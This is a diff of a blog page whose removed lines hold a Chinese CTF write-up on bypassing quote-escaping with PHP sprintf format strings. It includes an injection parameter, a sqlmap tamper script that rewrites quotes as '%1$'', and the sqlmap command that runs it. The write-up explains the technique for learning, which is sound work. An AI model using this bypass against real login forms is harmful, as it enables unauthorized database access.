-            <h1 id="格式化漏洞"><a href="#格式化漏洞" class="headerlink" title="格式化漏洞"></a>格式化漏洞</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>sql注入 + % 报错<br><img src="1.png" alt="1536150551652"></p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="格式化注入漏洞"><a href="#格式化注入漏洞" class="headerlink" title="格式化注入漏洞"></a>格式化注入漏洞</h3><p>在php调用<code>sprintf</code>函数时,如果 参数的数量少于 <code>%</code>数量,会报错.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select * from user where username = '%\' and 1=1#' and password='%s';"</span>;</span><br><span class="line">$args = <span class="string">"admin"</span>;</span><br><span class="line"><span class="keyword">echo</span> sprintf( <span class="string">"select * from user where username = '%\' and 1=1#' and password='%s';"</span>, $args) ;</span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$sql = <span class="string">"select * from user where username = '%1$\' and 1=1#' and password='%s';"</span>;</span><br><span class="line">$args = <span class="string">"admin"</span>;</span><br><span class="line"><span class="keyword">echo</span> sprintf( <span class="string">"select * from user where username = '%1$\' and 1=1#' and password='%s';"</span>, $args) ;</span><br><span class="line"><span class="comment">//select * from user where username = '' and 1=1#' and password='admin';</span></span><br></pre></td></tr></table></figure>
-<p>其中通过<code>%&#39;</code>会先被waf过滤为<code>%\&#39;</code>然后,<code>sprintf</code>会把<code>%\</code>吞掉.其中<code>%1$&#39;</code>原理一样.</p>
-<p>但是不知道为什么,<font color="red"><code>%&#39;</code>会报错. </font>而<code>%1$&#39;</code><font color="red">不会报错 </font>.</p>
-<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>构造参数 <code>admin%1$&#39; or 1=1</code> 与 <code>admin$1&#39; or 1=2</code>存在报错注入.可以通过sqlmap编写 tamper 去跑.</p>
-<h3 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">v0.0.1</span></span><br><span class="line"><span class="string">2018.3.30</span></span><br><span class="line"><span class="string">filename: sprintf.py</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    通过格式化字符串漏洞来完成对单引号的闭合</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">"'"</span>, <span class="string">"%1$'"</span>)</span><br></pre></td></tr></table></figure>
-<p>然后执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “request.txt” -p username –level 3 –dbms mysql –tamper sprintf.py</span><br></pre></td></tr></table></figure>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/09/08/sprintf格式输出逃逸/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
